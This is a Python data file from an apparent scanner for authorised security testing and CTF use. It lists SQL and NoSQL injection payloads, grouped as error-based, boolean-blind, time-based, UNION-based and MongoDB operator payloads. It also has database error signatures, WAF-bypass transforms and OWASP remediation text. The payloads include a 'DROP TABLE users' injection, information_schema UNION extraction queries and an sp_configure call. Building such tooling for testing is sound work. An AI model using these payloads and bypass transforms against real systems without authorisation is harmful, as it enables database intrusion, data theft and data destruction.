"""
payloads/sqli_payloads.py
All SQL Injection payload data — zero logic, pure data.
Import these into modules/sqli.py.

For Authorized Security Testing and CTF Competitions Only.
"""
from __future__ import annotations
from typing import Dict, List, Tuple

# ── Error-based payloads ──────────────────────────────────────────────────────
ERROR_PAYLOADS: List[str] = [
    "'", "\"", "1'", "1\"",
    "' OR '1'='1",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' #",
    "1') OR ('1'='1",
    "'; DROP TABLE users; --",
    "1' UNION SELECT NULL--",
    "' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a,"
    " (SELECT user()), 0x3a, (SELECT version())) AS x FROM information_schema.tables GROUP BY x) AS y)--",
    "' UNION SELECT NULL, NULL, CONCAT((SELECT database()), 0x3a,"
    " (SELECT user()), 0x3a, (SELECT version())), NULL--",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1'--",
    "1; SELECT SLEEP(0)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
    "\" OR \"1\"=\"1",
    "\" OR 1=1--",
    "admin'--",
    "admin' #",
    "' OR 'x'='x",
    "') OR ('x'='x",
    "1 OR 1=1",
    "1; SELECT 1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' GROUP BY 1,2--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' UNION ALL SELECT NULL--",
    # NoSQL injection (MongoDB)
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
    '{"$regex": ".*"}',
    "' || '1'=='1",
    # SQLite specific
    "' UNION SELECT sqlite_version()--",
    "1' AND (SELECT SUBSTR(sqlite_version(),1,1))='3'--",
]

# ── Error signatures for DB error-based detection ─────────────────────────────
DB_ERROR_SIGNATURES: List[str] = [
    "sql syntax", "mysql", "postgresql", "sqlite",
    "syntax error", "unclosed quotation",
    "oracle", "quoted string", "pg_query", "mysqli",
    "odbc", "jdbc", "mssql", "database error",
    "sqlstate", "warning: mysql",
    "ORA-", "PLS-", "SP2-",
    "invalid column", "unknown column",
    "column count doesn't match",
    "division by zero", "conversion failed",
    "unterminated string", "unexpected end",
    "unexpected token", "right syntax to use",
    "mongod", "mongodb", "pymongo",
    "sequelize", "typeorm", "knex",
]

# Grouped by DB for richer error-pattern matching
DB_ERROR_PATTERNS: Dict[str, List[str]] = {
    "MySQL":      ["you have an error in your sql syntax", "mysql_fetch", "warning: mysql"],
    "MSSQL":      ["unclosed quotation mark", "ole db.*sql server", "mssql"],
    "Oracle":     ["ORA-", "PLS-", "SP2-", "oracle.*driver"],
    "PostgreSQL": ["pg_query()", "psqlexception", "postgresql"],
    "SQLite":     ["sqlite.*error", "sqlite3.operationalerror"],
    "MongoDB":    ["mongod", "mongodb", "pymongo"],
    "ORM":        ["sequelize", "typeorm", "knex"],
}

# ── Boolean-based blind payloads ─────────────────────────────────────────────
BOOLEAN_PAYLOADS: Dict[str, List[str]] = {
    'true': [
        "1' AND '1'='1",
        "1' OR '1'='1",
        "1' AND 1=1--",
        "1') AND ('1'='1",
        "1 AND 1=1",
        "1' AND 1=1 AND '1'='1",
        "1' AND (SELECT 1)=1--",
        "1 OR 1=1",
        "1' AND LENGTH(database())>0--",
        "1' AND SUBSTR(database(),1,1)>'a'--",
    ],
    'false': [
        "1' AND '1'='2",
        "1' AND 1=2--",
        "1') AND ('1'='2",
        "1 AND 1=2",
        "1' AND 1=2 AND '1'='1",
        "1' AND (SELECT 1)=2--",
        "1 AND 1=0",
        "1' AND LENGTH(database())<0--",
    ],
}

# ── Time-based blind payloads (payload, expected_delay_seconds) ───────────────
TIME_PAYLOADS: List[Tuple[str, float]] = [
    ("'; WAITFOR DELAY '0:0:5'--", 5.0),
    ("'; SELECT pg_sleep(5)--", 5.0),
    ("'; SELECT SLEEP(5)--", 5.0),
    ("' AND SLEEP(5)--", 5.0),
    ("' AND 1=SLEEP(5)--", 5.0),
    ("'; DBMS_LOCK.SLEEP(5);--", 5.0),
    ("1; SELECT SLEEP(5)--", 5.0),
    ("1 AND SLEEP(5)--", 5.0),
    ("' OR SLEEP(5)--", 5.0),
    ("') OR SLEEP(5)--", 5.0),
    ("1'; WAITFOR DELAY '0:0:5'--", 5.0),
    ("1 AND pg_sleep(5)--", 5.0),
    ("1; WAITFOR DELAY '0:0:5'--", 5.0),
    ("1) AND SLEEP(5)--", 5.0),
    ("1)) AND SLEEP(5)--", 5.0),
    ("' AND BENCHMARK(5000000,MD5(1))--", 5.0),
    ("1;SELECT 1 FROM PG_SLEEP(5)--", 5.0),
    ("' WAITFOR DELAY '0:0:5'--", 5.0),
    ("'; EXECUTE sp_configure 'show advanced options',1--", 3.0),
]

# Time payloads grouped by database for targeted probing
TIME_PAYLOADS_BY_DB: Dict[str, List[str]] = {
    "mysql":    ["' AND SLEEP(5)--", "' OR SLEEP(5)--", "1; SELECT SLEEP(5)--",
                 "' AND BENCHMARK(5000000,MD5(1))--"],
    "mssql":    ["'; WAITFOR DELAY '0:0:5'--", "' WAITFOR DELAY '0:0:5'--"],
    "postgres": ["'; SELECT pg_sleep(5)--", "'; SELECT 1 FROM PG_SLEEP(5)--"],
    "oracle":   ["'; DBMS_LOCK.SLEEP(5);--",
                 "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--"],
    "generic":  ["' AND SLEEP(5)--", "1; SELECT SLEEP(5)--"],
}

# ── UNION-based payloads ──────────────────────────────────────────────────────
UNION_PAYLOADS: List[str] = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,database(),version()--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION ALL SELECT NULL--",
]

# ── NoSQL payloads ────────────────────────────────────────────────────────────
NOSQL_PAYLOADS: List[str] = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
    '{"$regex": ".*"}',
    '{"$gt": "", "$ne": "invalid"}',
    "' || '1'=='1",
    '{"$where": "sleep(5000)"}',
]

# ── WAF bypass transforms (applied programmatically to any base payload) ──────
WAF_BYPASS_TRANSFORMS = [
    lambda p: p.replace(" ", "/**/"),            # comment spaces
    lambda p: p.replace(" ", "%20"),             # URL encode spaces
    lambda p: p.replace("SELECT", "SeLeCt"),     # case variation
    lambda p: p.replace("UNION", "UN/**/ION"),   # split keyword
    lambda p: p.replace("'", "%27"),             # URL encode quote
    lambda p: p + "%00",                         # null byte suffix
    lambda p: p.replace("AND", "AnD"),           # case — AND
    lambda p: p.replace("OR", "Or"),             # case — OR
    lambda p: p.replace(" ", "\t"),              # tab substitution
    lambda p: p.replace("SLEEP", "SleEp"),       # case — SLEEP
]

# Remediation guidance (OWASP SQLi Prevention Cheat Sheet)
REMEDIATION = (
    "1. Use parameterized queries / prepared statements (primary defense). "
    "2. Apply stored procedures with safe coding practices. "
    "3. Allow-list input validation for table/column names. "
    "4. Enforce least-privilege DB accounts. "
    "See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
)

# Alias expected by modules/sqli.py
ERROR_SIGNATURES = DB_ERROR_SIGNATURES
